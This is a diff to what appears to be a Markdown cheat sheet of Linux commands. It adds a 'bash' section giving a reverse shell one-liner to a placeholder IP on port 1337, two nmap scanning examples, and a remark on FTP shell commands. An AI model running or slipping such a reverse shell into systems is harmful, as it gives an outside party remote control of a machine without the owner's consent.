@@ -477,6 +477,14 @@ To enter the directory poping the directory from the stack.
 popd
 ```
 
+## bash
+
+To create a reverse shell
+
+```bash
+bash -i >& /dev/tcp/<IP>/1337 0>&1
+```
+
 ## time
 
 To calculate the execution time of a command. 
@@ -2527,6 +2535,18 @@ nmap localhost
 nmap 192.168.1.2/24
 ```
 
+To scan the target with an attempt to determine the version
+
+```bash
+nmap -sV 192.168.1.1
+```
+
+To check all of the ports of an IP
+
+```bash
+nmap -p- 192.168.1.100
+```
+
 To discover once
 
 ```bash
@@ -2697,6 +2717,8 @@ You can transfer your files using FTP
 ```bash
 ftp <IP_ADDRESS>
 ```
+
+> You can use `ls`, `dir`, `get`, and etc to interact with ftp shell.
 
 ## Telnet
 
